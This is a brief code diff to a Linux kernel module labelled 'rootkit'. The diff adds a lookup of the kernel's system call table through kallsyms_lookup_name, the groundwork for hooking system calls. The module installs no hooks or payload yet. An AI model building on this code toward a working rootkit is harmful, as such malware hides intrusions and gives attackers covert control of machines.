@@ -7,8 +7,14 @@ MODULE_AUTHOR("infernexio");
 MODULE_DESCRIPTION("rootkit");
 MODULE_VERSION("0.0.1");
 
+unsigned long *__sys_call_table = NULL;
+
+
+
 static int __init init_func(void){
     printk(KERN_INFO "rootkit: initalized\n");
+
+    __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 
     return 0;
 }
